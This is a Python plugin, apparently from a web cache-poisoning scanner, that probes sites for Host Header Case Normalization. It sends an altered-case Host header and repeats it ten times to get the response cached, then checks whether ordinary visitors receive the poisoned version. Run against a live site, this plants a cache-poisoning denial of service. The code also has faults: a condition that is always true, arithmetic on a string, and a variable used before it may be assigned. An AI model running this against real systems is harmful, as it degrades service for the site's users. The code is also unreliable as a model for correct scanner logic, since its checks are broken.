#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Attempts to find Cache Poisoning with Host Header Case Normalization (HHCN)  
https://youst.in/posts/cache-key-normalization-denial-of-service/
"""

from ..utils import *

VULN_NAME = "Host Header Case Normalization"

def HHCN(url, s, authent):
    behavior = False

    # replace min char by maj char in the domain
    domain = urlparse(url).netloc

    index = random.randint(0, len(domain) - 3)
    letter = domain[index]
    if letter != "." or letter != "-":
        letter = domain[index].upper()
    else:
        letter = letter - 1
        letter = domain[index].upper()
    domain = domain[:index] + letter + domain[index + 1:]

    headers = {"Host": domain}

    req_main = s.get(url, verify=False, timeout=10, auth=authent, allow_redirects=False)
    req_len = len(req_main.content)

    req_hhcn = s.get(url, headers=headers, verify=False, timeout=10, auth=authent, allow_redirects=False)
    req_hhcn_len = len(req_hhcn.content)

    if req_hhcn_len not in range(req_len - 50, req_len + 50):
        for rf in req_hhcn.headers:
            if "cache" in rf.lower() or "age" in rf.lower():
                behavior = "DIFFERENT RESPONSE LENGTH"
                for x in range(0, 10):
                    req_hhcn_bis = s.get(url, headers=headers, verify=False, timeout=10, auth=authent, allow_redirects=False)

        req_verify = s.get(url, verify=False, timeout=10, auth=authent)

        if len(req_hhcn_bis.content) == len(req_verify.content):
            print(f" \033[31m└── VULNERABILITY CONFIRMED\033[0m | HHCN | \033[34m{url}\033[0m | {behavior} {req_len}b <> {len(req_hhcn_bis.content)}b | PAYLOAD: {headers}")
        else:
            if behavior:
                print(f" \033[33m└── INTERESTING BEHAVIOR\033[0m | HHCN | \033[34m{url}\033[0m | {behavior} {req_len}b <> {req_hhcn_len}b | PAYLOAD: {headers}")

    if req_main.status_code != req_hhcn.status_code:
        for rf in req_hhcn.headers:
            if "cache" in rf.lower() or "age" in rf.lower():
                behavior = "DIFFERENT STATUS-CODE"
                for x in range(0, 10):
                    req_hhcn_bis = s.get(url, headers=headers, verify=False, timeout=10, auth=authent, allow_redirects=False)

        req_verify = s.get(url, verify=False, timeout=10, auth=authent)

        if req_hhcn_bis.status_code == req_verify.status_code:
            print(f" \033[31m└── VULNERABILITY CONFIRMED\033[0m | HHCN | \033[34m{url}\033[0m | {behavior} {req_main.status_code} <> {req_hhcn_bis.status_code} | PAYLOAD: {headers}")
        else:
            if behavior:
                print(f" \033[33m└── INTERESTING BEHAVIOR\033[0m | HHCN | \033[34m{url}\033[0m | {behavior} {req_main.status_code} <> {req_hhcn.status_code} | PAYLOAD: {headers}")


